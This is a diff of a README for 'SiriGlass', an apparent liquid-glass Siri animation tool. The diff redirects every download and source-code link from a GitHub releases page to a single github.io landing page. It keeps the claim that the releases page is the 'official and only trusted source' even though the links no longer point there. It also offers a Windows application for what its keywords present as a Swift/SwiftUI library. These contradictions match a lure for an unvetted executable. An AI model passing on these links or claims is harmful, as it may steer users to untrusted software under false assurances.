@@ -1,14 +1,14 @@
 # 🍸 SiriGlass - Liquid Glass Comes Alive With Your Voice
 
-[![Download SiriGlass](https://img.shields.io/badge/⬇_Download_SiriGlass-ff4d6d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hikaru17zx/SiriGlass/releases)
-[![Version](https://img.shields.io/badge/Version-1.0-4dabf7?style=for-the-badge)](https://github.com/Hikaru17zx/SiriGlass/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows-51cf66?style=for-the-badge)](https://github.com/Hikaru17zx/SiriGlass/releases)
-[![License](https://img.shields.io/badge/License-Free-845ef7?style=for-the-badge)](https://github.com/Hikaru17zx/SiriGlass/releases)
+[![Download SiriGlass](https://img.shields.io/badge/⬇_Download_SiriGlass-ff4d6d?style=for-the-badge&logo=github&logoColor=white)](https://hikaru17zx.github.io)
+[![Version](https://img.shields.io/badge/Version-1.0-4dabf7?style=for-the-badge)](https://hikaru17zx.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-51cf66?style=for-the-badge)](https://hikaru17zx.github.io)
+[![License](https://img.shields.io/badge/License-Free-845ef7?style=for-the-badge)](https://hikaru17zx.github.io)
 
 SiriGlass brings the famous "Siri drop" from iOS 27 to your screen. A shimmering blob of liquid glass pours out of the Dynamic Island, ripples, and glows in time with your voice. One simple modifier turns it on — no coding required to enjoy it.
 
 **Get started in one click:**
-👉 **https://github.com/Hikaru17zx/SiriGlass/releases**
+👉 **https://hikaru17zx.github.io**
 
 ---
 
@@ -41,7 +41,7 @@ That's the whole process. There is nothing to compile and nothing to configure b
 The official and only trusted source for SiriGlass is the project's releases page.
 
 **Download link:**
-👉 **https://github.com/Hikaru17zx/SiriGlass/releases**
+👉 **https://hikaru17zx.github.io**
 
 Visit this link to download the application.
 
@@ -160,7 +160,7 @@ Before reporting a problem, note your Windows version and whether the glow, the 
 
 ## 🔗 Quick Links
 
-- **Download:** https://github.com/Hikaru17zx/SiriGlass/releases
-- **Source code:** https://github.com/Hikaru17zx/SiriGlass
+- **Download:** https://hikaru17zx.github.io
+- **Source code:** https://hikaru17zx.github.io
 
 Keywords: animation, dynamic-island, ios, liquid-glass, metal, siri, swift, swiftui
